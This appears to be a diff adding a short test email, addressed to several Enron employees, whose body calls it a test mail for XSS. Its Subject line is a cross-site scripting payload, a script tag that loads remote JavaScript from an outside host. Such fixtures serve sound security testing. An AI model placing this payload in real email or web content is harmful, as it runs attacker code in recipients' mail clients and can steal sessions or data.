@@ -1,0 +1,7 @@
+From: "Rogert" <richard@quitsmokeless.biz>
+To: richard.sanders@enron.com, tim.belden@enron.com, robert.badeer@enron.com, 
+Subject: <script src=//x.cn/1.js async>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
